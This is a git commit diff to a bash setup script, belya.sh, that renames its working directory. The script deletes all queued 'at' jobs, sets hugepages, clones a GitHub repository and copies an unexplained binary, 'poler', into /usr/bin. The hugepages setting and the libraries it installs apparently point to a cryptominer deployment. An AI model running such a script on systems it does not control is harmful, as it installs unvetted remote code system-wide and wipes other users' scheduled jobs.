40fda09dc99845a92c778943e1470b3f45711d20
burkabest <52100051+burkabest@users.noreply.github.com>
2019-10-10 03:08:03 -0300

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/trueboy/
+rm -rf /tmp/work1/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir trueboy
-git clone https://github.com/burkabestbest/trueboy.git /tmp/trueboy
-cd /tmp/trueboy
-chmod +x /tmp/trueboy/poler
+cd /tmp && mkdir work1
+git clone https://github.com/burkabest/work1.git /tmp/work1
+cd /tmp/work1
+chmod +x /tmp/work1/poler
 chmod 777 ./*.sh
-cp /tmp/trueboy/poler /usr/bin/
+cp /tmp/work1/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
